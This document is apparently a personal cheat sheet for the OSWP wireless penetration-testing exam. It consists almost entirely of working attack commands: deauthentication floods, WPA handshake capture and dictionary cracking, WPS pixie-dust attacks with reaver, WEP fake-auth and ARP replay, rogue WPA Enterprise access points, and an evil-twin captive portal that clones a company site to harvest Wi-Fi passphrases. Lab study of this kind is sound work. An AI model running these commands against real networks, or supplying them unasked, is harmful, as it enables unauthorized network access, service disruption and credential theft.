# OSWP

## Airmon-ng
```
sudo airmon-ng check
sudo airmon-ng check kill

sudo /usr/sbin/airmon-ng
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 [channel #]
sudo airmon-ng stop wlan0

iw wlan0 info
iwconfig
ifconfig
```
## Airodump-ng 
#### Don't forget to specify interface
#### Don't forget to specify channel - otherwise will rotate
```
sudo airodump-ng [interface] -channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
sudo airodump-ng wlan0mon -c 2
```
|CMD|DESC|
|-----|-----|
|-w|output filename| 
|--bsssid|specific BSSID|
|--essid|specific client ESSID|
|-c|channel|
|-g|GPS|
|--ivs| Interval Vectors
|-R|Regular Expression|

## Aircrack-ng
```
aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
aircrack-ng -w /usr/local/share/dict/wordlist-probable.txt -e [essid] -b [bssid] psk.cap
```
## Aireplay-ng
```
sudo aireplay-ng [attack type] [# of attack] -a [BSSID] -c [clientBSSID] [interface]
sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
```
|CMD|DESC|
|-----|-----|
-0|# deauths
-1|Fake Authentication
-2|Interactive Packet REplay
-3|ARP Replay
-a|BSSID AP MAC
-c|Destination MAC
-h|Source MAC
-e|ESSID target AP SSID


## WPA/WPA2-PSK
```
sudo airodump-ng wlan0mon -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
WPA Handshake Captured
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```
## WPS Attack
```
sudo wash -i wlan0mon
-5 for 5GHz
airodump-ng --wps wlan0mon
sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v
sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v -K
sudo reaver --interface wlan0mon --bssid 6C:5A:B0:5D:A7:DC --channel 9 -vv -N -O reaver_output.pcap --pixie-dust 1

sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```
## WEP Attack 
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
** Must capture packets ** 
```
(( 4 windows ))
sudo airodump-ng wlan0mon -w output.cap

sudo aireplay-ng -1 0 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
-1 = fake auth, -e = essid, -a = bssid, -h = client mac
sudo aireplay-ng -1 6000 -o 1 -q 10 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
-1 6000 = fake auth every 6000 seconds, -o = send one packet at a time, -q = keep alive every 10 seconds
if fails, deauth

** Always do ARP replay ** 
sudo aireplay-ng -3 -b 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
-3 = ARP replay, -b = bssid, -h = client

** If fake auth fails, do regular deauth **
sudo aireplay-ng -0 0 -a [bssid] -c [clientmac] wlan0mon

sudo aircrack-ng -b 9C:EF:D5:FB:07:AC wep.txt-01.cap
Look for [H:E:X:K:E:Y]

wpa_supplicant_WEP.conf

network={
        ssid="<ssid>"
        key_mgmt=NONE
        wep_key0=<key>  # do not use : in the key
        wep_tx_keyidx=0
}

sudo airmon-ng stop wlan0mon
sudo wpa_supplicant -i wlan0 -c wep_supplicant
sudo dhclient wlan0
```
## Aircrack-ng
```
aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
aircrack-ng -w /usr/local/share/dict/wordlist-probable.txt -e [essid] -b [bssid] psk.cap
```
### John the Ripper
```
sudo nano /etc/john/john.conf
john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap

grep JTR | cut -f2 >> output.txt
john --format=netntlm output.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
### Hashcat
Hash types: https://hashcat.net/wiki/doku.php?id=example_hashes
```
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
hashcat -m [hashtype] [hash] [dictionary]
hashcat -m 2500 output.hccapx /usr/share/john/password.lst

```
## Useful Linux Commands
```
scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
gzip -d file .gz
find / -iname hashcat.potfile
sudo service NetworkManager restart
```
## NMAP
```
sudo nmap -sT -p- 10.10.8.8
-A = everything
-sS = SYN scan
-sT = scan TCP
-sU = scan UDP
-p- = all ports
```
## NetCat
```
sudo nc -z -v 10.10.8.8
-z = open ports
-v = verbose
```
## Attacking WPA Enterprise
```
sudo airodump-ng wlan0mon
tls.handshake.type==11 or tls.handshake.certificate
Auth = MGT = WPA Enterprise

sudo apt install freeradius
/etc/freeradius/3.0
nano ca.cnf, nano server.cnf
rm dh
make
sudo apt install hostapd-mana
mana.conf
mana.eap_user
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
## Certs
```
openssl x509 -in CERT_FILENAME -noout -enddate
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
make-ssl-cert generate-default-snakeoil --force-overwrite
```

## Captive Portal
```
sudo apt install apache2 libapache2-mod-php
wget -r -l2 https://www.megacorpone.com
/var/www/html/portal/index.php
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
/var/www/html/portal/login_check.php

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
sudo apt install dnsmasq
mco-dnsmasq.conf
sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
sudo netstat -lnp

sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53

/etc/apache2/sites-enabled/000-default.conf > mod_rewrite/mod_alias
sudo a2enmod rewrite
sudo a2enmod alias
systemctl restart apache2

/etc/apache2/sites-enabled/000-default.conf > SSL
sudo a2enmod ssl
sudo systemctl restart apache2

nano mco-hostapd.conf
sudo hostapd -B mco-hostapd.conf
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
```
## Manual Network Connections
```
wpa_supplicant.conf
sudo wpa_supplicant -i wlan0 -c wifi-client.conf
sudo dhclient wlan0
sudo iw list
sudo ip link set wlan0 up
sudo ip addr add 10.0.0.1/24 dev wlan0
dnsmasq.conf
sudo dnsmasq --conf-file=dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo apt install nftables
sudo nft add table nat
sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'
sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade
sudo hostapd hostapd.conf
```
```
sudo nmcli dev wifi connect [SSID] password [password]
wpa_supplicant -c <(wpa_passphrase [SSID] [password]) -i [interface]
```
## Proof.txt
```
curl http://192.168.1.1/proof.txt
```
